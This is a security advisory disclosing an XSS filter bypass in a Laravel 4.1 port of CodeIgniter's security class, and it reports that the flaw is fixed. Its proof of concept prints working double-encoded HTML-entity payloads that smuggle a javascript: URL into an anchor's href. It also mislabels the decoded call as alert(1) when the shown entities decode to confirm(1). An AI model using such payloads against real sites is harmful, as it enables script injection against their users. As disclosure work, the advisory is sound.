Laravel Security is a port of the security class from Codeigniter 2.1 for
Laravel 4.1. It relies upon a blacklist approach to filter out common
malicious inputs.

*=========*
*Vulnerability*
*==========*

The vulnerability lies in the fact that the XSS filter was decoding HTML
entities, therefore based upon this fact it was
possible to construct a payload that would successfully bypass the
filtering mechanisms and execute javascript.

*=============*
*Proof of concept*
*=============*

During intial test the following input was provided:

<a
href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41">Clickhere</a>

The filter decodes the HTML entities and hence the attack was being
blocked.

After Decoding:

<a href="javascript:alert(1)">Clickhere</a>

Next, we double encoded the entities:

<a
href="&#38&#35&#49&#48&#54&#38&#35&#57&#55&#38&#35&#49&#49&#56&#38&#35&#57&#55&#38&#35&#49&#49&#53&#38&#35&#57&#57&#38&#35&#49&#49&#52&#38&#35&#49&#48&#53&#38&#35&#49&#49&#50&#38&#35&#49&#49&#54&#38&#35&#53&#56&#38&#35&#57&#57&#38&#35&#49&#49&#49&#38&#35&#49&#49&#48&#38&#35&#49&#48&#50&#38&#35&#49&#48&#53&#38&#35&#49&#49&#52&#38&#35&#49&#48&#57&#38&#35&#52&#48&#38&#35&#52&#57&#38&#35&#52&#49">Clickhere</a>

And since the filter would decode the entities once, we are left with the
following:


<a
href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41">Clickhere</a>

Which is perfectly a valid syntax inside of href context and would execute
javascript.

*===*
*Fix*
*===*

The vulnerability has been fixed, the latest version doesn't decode HTML
entites and hence the attack is mitigated.
